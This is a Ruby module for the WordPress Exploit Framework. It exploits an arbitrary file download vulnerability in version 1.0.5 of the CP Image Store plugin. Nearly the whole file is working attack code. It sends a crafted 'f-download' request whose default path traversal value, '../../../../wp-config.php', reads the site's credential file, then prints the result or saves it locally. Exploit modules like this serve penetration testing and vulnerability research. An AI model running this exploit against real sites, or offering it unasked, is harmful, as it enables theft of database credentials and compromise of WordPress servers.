class Wpxf::Auxiliary::CpImageStoreArbitraryFileDownload < Wpxf::Module
  include Wpxf

  def initialize
    super

    update_info(
      name: 'CP Image Store Arbitrary File Download',
      desc: %(
        This module exploits a vulnerability in version 1.0.5 of the CP
        Image Store plugin which allows you to download any arbitrary
        file accessible by the user the web server is running as.
      ),
      author: [
        'Joaquin Ramirez Martinez',        # Disclosure
        'Rob Carr <rob[at]rastating.com>'  # WPXF module
      ],
      references: [
        ['EDB', '37559']
      ],
      date: 'Jun 10 2015'
    )

    register_options([
      StringOption.new(
        name: 'remote_file',
        desc: 'The relative or absolute path to the remote file to download',
        required: true,
        default: '../../../../wp-config.php'
      ),
      StringOption.new(
        name: 'export_path',
        desc: 'The file to save the file to',
        required: false
      ),
      IntegerOption.new(
        name: 'purchase_id',
        desc: 'A valid purchase ID',
        required: true,
        default: 1
      )
    ])
  end

  def check
    check_plugin_version_from_readme('cp-image-store', '1.0.6', '1.0.5')
  end

  def purchase_id
    normalized_option_value('purchase_id')
  end

  def remote_file
    normalized_option_value('remote_file')
  end

  def export_path
    return nil if normalized_option_value('export_path').nil?
    File.expand_path normalized_option_value('export_path')
  end

  def run
    return false unless super

    scoped_option_change('follow_http_redirection', false) do
      res = nil
      params = {
        'action' => 'cpis_init',
        'cpis-action' => 'f-download',
        'purchase_id' => purchase_id.to_s,
        'cpis_user_email' => Utility::Text.rand_email,
        'f' => remote_file
      }

      if export_path.nil?
        emit_info 'Requesting file...'
        res = execute_get_request(
          url: full_uri,
          params: params
        )
      else
        emit_info 'Downloading file...'
        res = download_file(
          url: full_uri,
          params: params,
          method: :get,
          local_filename: export_path
        )
      end

      if res.nil? || res.timed_out?
        emit_error 'Request timed out, try increasing the http_client_timeout'
        return false
      end

      if res.code == 302
        emit_error 'The purchase ID appears to be invalid or reached the maximum number of downloads'
        return false
      end

      if res.code != 200
        emit_error "Server responded with code #{res.code}"
        return false
      end

      if export_path.nil?
        emit_success "Result: \n#{res.body}"
      else
        emit_success "Downloaded file to #{export_path}"
      end
    end

    true
  end
end
